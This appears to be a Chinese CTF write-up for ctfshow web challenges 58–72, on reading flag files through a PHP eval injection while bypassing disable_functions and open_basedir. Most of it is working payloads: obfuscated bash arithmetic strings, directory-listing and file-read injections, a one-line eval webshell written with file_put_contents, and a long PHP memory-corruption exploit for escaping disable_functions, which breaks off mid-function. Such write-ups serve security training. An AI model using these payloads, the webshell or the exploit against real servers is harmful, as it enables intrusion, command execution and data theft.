<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;10</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line"></span><br><span class="line">repeat &#x3D; &#39;$((~$(())))&#39;</span><br><span class="line">for i in range(1,38):</span><br><span class="line">    if i &#x3D;&#x3D; 1:</span><br><span class="line">        continue</span><br><span class="line">    repeat +&#x3D; &#39;+$((~$(())))&#39;</span><br><span class="line">print(&#39;$((~$((&#39;+repeat+&#39;))))&#39;)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813101924678.png" alt="image-20210813101924678"></p>
<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><blockquote>
<p>接下来的系列是绕过disable_functions系列</p>
</blockquote>
<p><strong>获取当前文件路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">命令：c=print_r(scandir(dirname(<span class="string">'__FILE__'</span>)))</span><br><span class="line">命令：c=print_r(scandir(dirname(<span class="string">"file"</span>)));</span><br><span class="line">命令：c=print_r(scandir(dirname(<span class="string">"dir"</span>)));</span><br><span class="line">命令：c=print_r(scandir(dirname(<span class="string">"__dir__"</span>)));</span><br><span class="line">回显：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; a.php [<span class="number">3</span>] =&gt; flag.php [<span class="number">4</span>] =&gt; index.php )</span><br><span class="line">    </span><br><span class="line">命令：c=$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">'glob://*'</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f.<span class="string">" "</span>);&#125;</span><br><span class="line">回显：a.php flag.php index.php</span><br><span class="line"></span><br><span class="line">命令：c=$a=opendir(<span class="string">"./"</span>); <span class="keyword">while</span>($file = readdir($a))&#123;<span class="keyword">echo</span> $file.<span class="string">" "</span>;&#125;;</span><br><span class="line">回显：.. . a.php flag.php index.php</span><br></pre></td></tr></table></figure></div>

<p><strong>读取任意的文件</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">命令：c=<span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">命令：c=readfile(<span class="string">'flag.php'</span>);</span><br><span class="line">回显：php代码要查看源代码</span><br><span class="line">    </span><br><span class="line">命令：c=var_dump(file(<span class="string">'flag.php'</span>));</span><br><span class="line">命令：c=print_r(file(<span class="string">'flag.php'</span>));</span><br><span class="line">回显：数组显示输出</span><br><span class="line">    </span><br><span class="line">通过fopen去读取文件内容</span><br><span class="line">fread() <span class="comment">//读取文件</span></span><br><span class="line">fgets() <span class="comment">//从文件指针中读取一行</span></span><br><span class="line">fgetc() <span class="comment">//从文件指针中读取字符</span></span><br><span class="line">fgetss() <span class="comment">//从文件指针中读取一行并过滤HTML标记</span></span><br><span class="line">fgetcsv() <span class="comment">//从文件指针中读入一行并解析CSV字段</span></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line"><span class="comment">//一行行字符形式</span></span><br><span class="line">c=$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符形式</span></span><br><span class="line">c=$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组形式</span></span><br><span class="line">c=$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过高亮显示php文件</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>或者直接用一些未禁用的函数写入一句话木马</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;file_put_contents(&#39;gylq.php&#39;,&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);</span><br></pre></td></tr></table></figure></div>

<p><strong>用蚁剑连接读取flag</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813111738922.png" alt="image-20210813111738922"></p>
</blockquote>
<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><blockquote>
<p>和上题源码差不多</p>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;print_r(scandir(dirname(&#39;__FILE__&#39;))); &#x2F;&#x2F;查看路径</span><br><span class="line">c&#x3D;show_source(&#39;flag.php&#39;);</span><br></pre></td></tr></table></figure></div>

<h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><blockquote>
<ul>
<li>file_get_contents被禁了</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">"./"</span>)); <span class="comment">//查看路径</span></span><br><span class="line"><span class="comment">//用file_put_contents写一句话</span></span><br><span class="line"><span class="comment">//也可以利用curl实现get和post请求命令执行</span></span><br></pre></td></tr></table></figure></div>

<p>其他读取文件payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一行行字符形式</span></span><br><span class="line">c=$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符形式</span></span><br><span class="line">c=$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组形式</span></span><br><span class="line">c=$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过高亮显示php文件</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//复制和改名</span></span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>); </span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><blockquote>
<p>这回fopen被禁了</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">"./"</span>));<span class="comment">//查看路径</span></span><br></pre></td></tr></table></figure></div>

<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//也可以用file_put_contents写shell</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">'flag.php'</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><blockquote>
<p>file_put_contents被禁了</p>
</blockquote>
<p>查路径的姿势</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=$a=opendir(<span class="string">'./'</span>);<span class="keyword">while</span>(($file = readdir($a)))&#123;<span class="keyword">echo</span> $file.<span class="string">" "</span>;&#125;</span><br><span class="line"></span><br><span class="line">c=print_r(scandir(<span class="string">"."</span>));</span><br><span class="line"><span class="comment">//用current取出localeconv中的.来读取路径</span></span><br><span class="line">c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure></div>

<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">c=highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="comment">//print_r(next(array_reverse(scandir(current(localeconv())))))取出flag.php这个然后访问</span></span><br><span class="line">c=show_source((next(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure></div>

<h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">c=highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="comment">//print_r(next(array_reverse(scandir(current(localeconv())))))取出flag.php这个然后访问</span></span><br><span class="line">c=show_source((next(array_reverse(scandir(current(localeconv()))))));</span><br><span class="line"><span class="comment">//查看所有变量</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">'flag.php'</span>);var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure></div>

<h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">c=highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="comment">//print_r(next(array_reverse(scandir(current(localeconv())))))取出flag.php这个然后访问</span></span><br><span class="line">c=show_source((next(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure></div>

<h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">c=highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="comment">//print_r(next(array_reverse(scandir(current(localeconv())))))取出flag.php这个然后访问</span></span><br><span class="line">c=show_source((next(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure></div>

<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><blockquote>
<p>这次flag不在当前目录，在根目录</p>
</blockquote>
<p><strong>查看flag路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure></div>

<p><strong>获取flag的方法</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">include_once</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">'/flag.txt'</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">include_once</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">'/flag.txt'</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>扫目录姿势</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));</span><br><span class="line"></span><br><span class="line">c&#x3D;$a&#x3D;new directoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo $f.&quot; &quot;;&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;include_once(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure></div>

<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new directoryiterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo $f.&quot; &quot;;&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;include_once(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure></div>

<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><blockquote>
<p>和上题一样</p>
</blockquote>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><blockquote>
<p>这题给了源码，首先了解几个函数</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">ob_get_contents —— 返回输出缓冲区的内容</span><br><span class="line">ob_end_clean    —— 清空（擦除）缓冲区并关闭输出缓冲 </span><br><span class="line">此函数丢弃顶层输出缓冲区的内容并关闭这个缓冲区，如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents(),因为当调用ob_end_clean()时缓冲区内容将被丢弃</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'system("ls");'</span>;</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line">$c = ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="comment">//$c中会存储缓冲区输出的内容全部获取</span></span><br><span class="line"><span class="comment">//接着ob_end_clean()将缓冲区的内容丢弃并且关闭</span></span><br></pre></td></tr></table></figure></div>

<p>看看源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>preg_replace将你得到的数据中字母和数字全部转换为?，所以你得想办法绕过，不然输出结果都是?，利用exit()直接中断后面的运行，让我们前面的正常运行</strong></p>
</blockquote>
<p>查路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=$a=<span class="keyword">new</span> directoryIterator(<span class="string">'glob:///*'</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span> $f.<span class="string">" "</span>;&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure></div>

<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">'/flag.txt'</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure></div>

<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>查一下路径，flag0.txt</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=$a=<span class="keyword">new</span> directoryIterator(<span class="string">'glob:///*'</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span> $f.<span class="string">" "</span>;&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure></div>

<p>发现好像无法读取</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813215221918.png" alt="image-20210813215221918"></p>
</blockquote>
<p><strong>发现这题有open_basedir和disable_functions的限制</strong></p>
<blockquote>
<p><strong>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</strong></p>
<p><strong>disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</strong></p>
</blockquote>
<p>正好群主有现成的发出来exp</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(<span class="string">"%c"</span>,($ptr &amp; <span class="number">0xff</span>));</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(<span class="string">"%c"</span>,($v &amp; <span class="number">0xff</span>));</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) 